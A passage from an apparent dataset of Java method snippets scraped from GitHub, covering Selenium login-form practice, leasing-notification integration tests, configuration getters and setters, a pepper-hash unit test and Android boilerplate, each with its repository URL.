\"drivers/chromedriver.exe\");\n\t\tWebDriver driver = new ChromeDriver();\n\t\tString url = \"https://opensource-demo.orangehrmlive.com/index.php/auth/login\";\n\n\t\tdriver.get(url);\n\n\t\t// sendKeys()\n\n\t\tWebElement userName= driver.findElement(By.id(\"txtUsername\"));\n\t\tuserName.sendKeys(\"Admin\");\n\n\t\t// clear()\n\t\tuserName.clear();\n\t\tuserName.sendKeys(\"Hello\");\n\n\t\t// isDisplayed()\n\n//\t\tboolean loginBtnDisp = driver.findElement(By.id(\"btnLogin\")).isDisplayed();\n//\t\tSystem.out.println(loginBtnDisp);\n\n\t\t// isEnabled()\n\t\t\n//\t\tboolean loginBtnenabled = driver.findElement(By.id(\"btnLogin\")).isEnabled();\n//\t\tSystem.out.println(loginBtnenabled);\n//\t\t\n//\t\t// isSelected()\n//\t\t\n//\t\tboolean loginBtnSelected= driver.findElement(By.id(\"btnLogin\")).isSelected();\n//\t\tSystem.out.println(loginBtnSelected);\n\t\t\n\t\t// getText() visible text\n\t\t\n\t\t\n\t\tdriver.findElement(By.id(\"btnLogin\")).click();\n\t\tString errorMsg= driver.findElement(By.id(\"spanMessage\")).getText();\n\t\tSystem.out.println(errorMsg);\n\t\t\n\t\tif(errorMsg.equalsIgnoreCase(\"Vous devez remplir le champ Mot de passe\")) {\n\t\t\tSystem.out.println(\"Correct message displayed\");\n\t\t}else {\n\t\t\tSystem.out.println(\"Wrong message displayed\");\n\t\t}\n\t\t\n\t\t// getAttribute() \n\t\t\n\t\tString loginValue= driver.findElement(By.id(\"btnLogin\")).getAttribute(\"value\");\n\t\t\n\t\tSystem.out.println(loginValue);\n\t\t\n\t\t//FindElement vs FindElements\n\t\t//radio button- check box\n\t\t//drop downs\n\t\t//webtable\n\t\t\n\t\t// submit()\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class3/WebElementCommands.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30054, "method_name": "saveUser", "class_name": "MessageServiceIT", "params": ["String", "String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "User", "snippet": "    private User saveUser(String login, String fName, String lName, String email) {\n        User user = new User();\n        user.setLogin(login);\n        user.setPassword(RandomStringUtils.random(60));\n        user.setActivated(true);\n        user.setBankAccountIBAN(DEFAULT_IBAN);\n        user.setFirstName(fName);\n        user.setLastName(lName);\n        user.setEmail(email);\n\n        return userRepository.saveAndFlush(user);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30055, "method_name": "init", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        owner = saveUser(DEFAULT_LOGIN, DEFAULT_FIRSTNAME, DEFAULT_LASTNAME, DEFAULT_EMAIL);\n        requester = saveUser(USER2_LOGIN, \"Randy\", \"Marsh\", \"rm@sp.com\");\n        user3 = saveUser(USER3_LOGIN, \"Towel\", \"Wet\", \"twl@tegr.com\");\n\n        gardenField = new GardenField();\n        gardenField.setName(GARDEN_NAME);\n        gardenField.setSizeInM2(SIZE_IN_M2);\n        gardenField.setPricePerM2(PRICE_PER_M2);\n        gardenField.setLatitude(LATITUDE);\n        gardenField.setLongitude(LONGITUDE);\n        gardenField.setCity(CITY);\n        gardenField.setRoofed(ROOFED);\n        gardenField.setGlassHouse(GLASS_HOUSE);\n        gardenField.setHigh(HIGH);\n        gardenField.setWater(WATER);\n        gardenField.setElectricity(ELECTRICITY);\n        gardenField.setPhValue(PH_VALUE);\n        gardenField.setOwner(owner);\n        gardenFieldRepository.saveAndFlush(gardenField);\n\n        leasing = new Leasing()\n            .from(DEFAULT_FROM)\n            .to(DEFAULT_TO)\n            .gardenField(gardenField)\n            .paymentSessionId(\"test\")\n            .user(requester);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30056, "method_name": "getMessageCountForUser", "class_name": "MessageServiceIT", "params": ["User"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int getMessageCountForUser(User user) {\n        return (int) messageRepository.findAll().stream()\n            .filter(notif -> notif.getUserTo().getId().equals(user.getId())).count();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30057, "method_name": "testCreateOpenLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateOpenLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.OPEN);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation + 1);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_OPEN);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30058, "method_name": "testCreateReservedLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateReservedLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.RESERVED);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation + 1);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_RESERVED);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30059, "method_name": "testCreateRejectedLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateRejectedLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.REJECTED);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation + 1);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_REJECTED);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30060, "method_name": "testCreateCancelledLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCancelledLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.CANCELLED);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation + 1);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_CANCELLED);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30061, "method_name": "testSameThreadInTwoNotifications", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSameThreadInTwoNotifications() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.CANCELLED);\n        leasingRepository.saveAndFlush(leasing);\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        leasing.setStatus(LeasingStatus.RESERVED);\n        leasingRepository.saveAndFlush(leasing);\n        MessageDTO notif2DTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation + 1);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation +1);\n        assertThat(notifDTO.getThread()).isEqualByComparingTo(notif2DTO.getThread());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30062, "method_name": "generateCacheFile", "class_name": "Config", "params": ["String"], "throws": null, "modifiers": [], "return_type": "File", "snippet": "    File generateCacheFile(String url) {\n        String name = fileNameGenerator.generate(url);\n        return new File(cacheRoot, name);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/Config.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30063, "method_name": "getMarcaAutomovil", "class_name": "Automovil", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMarcaAutomovil() {\n        return marca;\n    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/S/Automovil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30064, "method_name": "onDraw", "class_name": "Practice13ShadowLayerView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        paint.setTextSize(120);\n        canvas.drawText(\"Hello Geekholt\", 50, 200, paint);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson2/Practice13ShadowLayerView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 30065, "method_name": "init", "class_name": "Owner", "params": ["String", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "Owner", "snippet": "    public Owner init(String firstName, String lastName, int age){\n        this.firstName = firstName;\n        this.lastName = lastName;\n        this.age = age;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30066, "method_name": "getFirstName", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFirstName(){\n        return firstName;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30067, "method_name": "getLastName", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLastName(){\n        return lastName;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30068, "method_name": "getAge", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAge(){\n        return age;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30069, "method_name": "serialize", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ObjectTag", "snippet": "    public ObjectTag serialize(){\n        ObjectTag ot = new ObjectTag(\"Owner\");\n        ot.addTag(new StringTag(\"firstName\", firstName));\n        ot.addTag(new StringTag(\"lastName\", lastName));\n        ot.addTag(new IntTag(\"age\", age));\n        return ot;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30070, "method_name": "execute", "class_name": "ButtonKeyProcessor", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(int state, int action) {\n        if (state == Gamepad.BUTTON_RELEASED) {\n            press(mapper[action]);\n        }\n        else {\n            release(mapper[action]);\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/ButtonKeyProcessor.java", "stars": "4", "class_props": {"extends": "KeyProcessor", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30071, "method_name": "isShow", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isShow() {\n    return show;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30072, "method_name": "setShow", "class_name": "WechatMpProperties", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setShow(boolean show) {\n    this.show = show;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30073, "method_name": "getAesKey", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAesKey() {\n    return aesKey;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30074, "method_name": "setAesKey", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAesKey(String aesKey) {\n    this.aesKey = aesKey;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30075, "method_name": "getAppId", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAppId() {\n    return this.appId;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30076, "method_name": "setAppId", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAppId(String appId) {\n    this.appId = appId;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30077, "method_name": "getSecret", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSecret() {\n    return this.secret;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30078, "method_name": "setSecret", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSecret(String secret) {\n    this.secret = secret;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30079, "method_name": "getToken", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getToken() {\n    return this.token;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30080, "method_name": "setToken", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setToken(String token) {\n    this.token = token;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30081, "method_name": "toString", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    return ToStringBuilder.reflectionToString(this,\n        ToStringStyle.MULTI_LINE_STYLE);\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30082, "method_name": "main", "class_name": "Demo01Iterator", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u4e00\u4e2a\u96c6\u5408\u5bf9\u8c61\n        Collection<String> coll = new ArrayList<>();\n        //\u5f80\u96c6\u5408\u4e2d\u6dfb\u52a0\u5143\u7d20\n        coll.add(\"\u59da\u660e\");\n        coll.add(\"\u79d1\u6bd4\");\n        coll.add(\"\u9ea6\u8fea\");\n        coll.add(\"\u8a79\u59c6\u65af\");\n        coll.add(\"\u827e\u5f17\u68ee\");\n\n        /*\n            1.\u4f7f\u7528\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5iterator()\u83b7\u53d6\u8fed\u4ee3\u5668\u7684\u5b9e\u73b0\u7c7b\u5bf9\u8c61,\u4f7f\u7528Iterator\u63a5\u53e3\u63a5\u6536(\u591a\u6001)\n            \u6ce8\u610f:\n                Iterator<E>\u63a5\u53e3\u4e5f\u662f\u6709\u6cdb\u578b\u7684,\u8fed\u4ee3\u5668\u7684\u6cdb\u578b\u8ddf\u7740\u96c6\u5408\u8d70,\u96c6\u5408\u662f\u4ec0\u4e48\u6cdb\u578b,\u8fed\u4ee3\u5668\u5c31\u662f\u4ec0\u4e48\u6cdb\u578b\n         */\n        //\u591a\u6001  \u63a5\u53e3            \u5b9e\u73b0\u7c7b\u5bf9\u8c61\n        Iterator<String> it = coll.iterator();\n\n\n        /*\n            \u53d1\u73b0\u4f7f\u7528\u8fed\u4ee3\u5668\u53d6\u51fa\u96c6\u5408\u4e2d\u5143\u7d20\u7684\u4ee3\u7801,\u662f\u4e00\u4e2a\u91cd\u590d\u7684\u8fc7\u7a0b\n            \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5faa\u73af\u4f18\u5316\n            \u4e0d\u77e5\u9053\u96c6\u5408\u4e2d\u6709\u591a\u5c11\u5143\u7d20,\u4f7f\u7528while\u5faa\u73af\n            \u5faa\u73af\u7ed3\u675f\u7684\u6761\u4ef6,hasNext\u65b9\u6cd5\u8fd4\u56defalse\n         */\n        while(it.hasNext()){\n            String e = it.next();\n            System.out.println(e);\n        }\n        System.out.println(\"----------------------\");\n        for(Iterator<String> it2 = coll.iterator();it2.hasNext();){\n            String e = it2.next();\n            System.out.println(e);\n        }\n\n\n       /* //2.\u4f7f\u7528Iterator\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5hasNext\u5224\u65ad\u8fd8\u6709\u6ca1\u6709\u4e0b\u4e00\u4e2a\u5143\u7d20\n        boolean b = it.hasNext();\n        System.out.println(b);//true\n        //3.\u4f7f\u7528Iterator\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5next\u53d6\u51fa\u96c6\u5408\u4e2d\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\n        String s = it.next();\n        System.out.println(s);//\u59da\u660e\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);//\u6ca1\u6709\u5143\u7d20,\u8fd4\u56defalse\n        s = it.next();//\u6ca1\u6709\u5143\u7d20,\u5728\u53d6\u51fa\u5143\u7d20\u4f1a\u629b\u51faNoSuchElementException\u6ca1\u6709\u5143\u7d20\u5f02\u5e38\n        System.out.println(s);*/\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/13.%E3%80%90Collection%E3%80%81%E6%B3%9B%E5%9E%8B%E3%80%91-%E7%AC%94%E8%AE%B0/code/02_CollectionAndReflect/src/com/itheima/demo02/Iterator/Demo01Iterator.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30083, "method_name": "setUp", "class_name": "HashGeneratorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUp() {\n        hashGenerator = new HashGenerator(PEPPER_VALUE);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGeneratorTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30084, "method_name": "hasher_devrait_retourner_un_hash_de_donnees_avec_un_pepper", "class_name": "HashGeneratorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void hasher_devrait_retourner_un_hash_de_donnees_avec_un_pepper() {\n        // Given\n        String chaine = \"DUPONTJEAN1990-12-12PARIS\";\n\n        // When\n        String resultat = hashGenerator.hasherAvecPepper(chaine);\n\n        // Then\n        assertThat(resultat).isEqualTo(\"4ed6o/Jcn8puliRsyKswvY8/afhZ4RpVQJwsPjIWxsSinWEzBAO6UAmpA1GEOLUBRx0rArLaVFtCM4Fk/ZX8ig==\");\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGeneratorTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30085, "method_name": "hasher_devrait_retourner_toujours_le_meme_hash_de_donnees_pour_une_meme_chaine", "class_name": "HashGeneratorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void hasher_devrait_retourner_toujours_le_meme_hash_de_donnees_pour_une_meme_chaine() {\n        // Given\n        String chaine = \"DUPONTJEAN1990-12-12PARIS\";\n\n        // When\n        String result1 = hashGenerator.hasherAvecPepper(chaine);\n        String result2 = hashGenerator.hasherAvecPepper(chaine);\n\n        // Then\n        assertThat(result1).isEqualTo(\"4ed6o/Jcn8puliRsyKswvY8/afhZ4RpVQJwsPjIWxsSinWEzBAO6UAmpA1GEOLUBRx0rArLaVFtCM4Fk/ZX8ig==\");\n        assertThat(result2).isEqualTo(result1);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGeneratorTest.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30086, "method_name": "afterPropertiesSet", "class_name": "SecurityProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterPropertiesSet() {\n        // \u4e00\u4e9b\u9ed8\u8ba4\u5f00\u653e\u7684\u63a5\u53e3\n        permitAllUrls.addAll(Arrays.asList(\n                \"/swagger-ui.html\",\n                \"/v2/**\",\n                \"/swagger-resources/**\",\n                \"/webjars/**\",\n                \"/resources/**\",\n                \"/*.html\",\n                \"/*.htm\",\n                \"/*.js\",\n                \"/*.css\")\n        );\n        RequestMappingHandlerMapping mapping = applicationContext.getBean(RequestMappingHandlerMapping.class);\n        Map<RequestMappingInfo, HandlerMethod> map = mapping.getHandlerMethods();\n\n        // \u6536\u96c6 NotAuth \u6ce8\u89e3\u7684\u63a5\u53e3\n        map.keySet().forEach(info -> {\n            HandlerMethod handlerMethod = map.get(info);\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getMethod(), NotAuth.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> permitAllUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), NotAuth.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> permitAllUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getMethod(), ValidateCode.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> validateCodeUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n\n            Optional.ofNullable(AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), ValidateCode.class))\n                    .ifPresent(inner -> info.getPatternsCondition().getPatterns()\n                            .forEach(url -> validateCodeUrls.add(ReUtil.replaceAll(url, \"\\\\{(.*?)\\\\}\", \"*\"))));\n        });\n\n        log.info(\"permit all urls: {}\", permitAllUrls);\n        log.info(\"validate code urls: {}\", validateCodeUrls);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/SecurityProperties.java", "stars": "6", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 30087, "method_name": "newInstance", "class_name": "OTCBuyFragment", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "OTCBuyFragment", "snippet": "    public static OTCBuyFragment newInstance() {\n        return new OTCBuyFragment();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 30088, "method_name": "onCreateView", "class_name": "OTCBuyFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,\n                             @Nullable Bundle savedInstanceState) {\n\n        View view = inflater.inflate(R.layout.otc_buy_fragment, container, false);\n        ButterKnife.bind(this, view);\n        return view;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 30089, "method_name": "onActivityCreated", "class_name": "OTCBuyFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@Nullable Bundle savedInstanceState) {\n        super.onActivityCreated(savedInstanceState);\n        // TODO: Use the ViewModel\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/fragment/otc/OTCBuyFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 30090, "method_name": "OnClick", "class_name": "OTCBuyFragment", "params": [], 